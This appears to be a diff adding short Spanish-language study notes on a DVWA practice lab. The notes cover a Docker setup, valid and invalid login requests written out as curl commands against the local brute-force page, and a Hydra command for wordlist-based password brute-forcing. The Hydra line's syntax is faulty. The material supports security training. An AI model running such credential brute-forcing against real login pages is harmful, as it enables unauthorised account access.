@@ -1,0 +1,46 @@
+
+#Instalacion dvwa
+
+sudo docker pull vulnerables/web-dvwa
+sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+curl valido:
+curl 'http://localhost:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: es,en-US;q=0.9,en;q=0.8,es-US;q=0.7' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: PHPSESSID=r5qthh2m6phdm1od12fud9qsn2; security=low' \
+  -H 'Referer: http://localhost:4280/vulnerabilities/brute/?username=&password=&Login=Login' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
+  -H 'sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  --compressed
+
+curl invalido:
+
+curl 'http://localhost:4280/vulnerabilities/brute/?username=hola&password=1234&Login=Login' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: es,en-US;q=0.9,en;q=0.8,es-US;q=0.7' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: PHPSESSID=r5qthh2m6phdm1od12fud9qsn2; security=low' \
+  -H 'Referer: http://localhost:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
+  -H 'sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  --compressed
+
+Hydra:
+
+hydra -l usuarios.txt  -P contraseñas.txt  http://localhost:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login# http-get
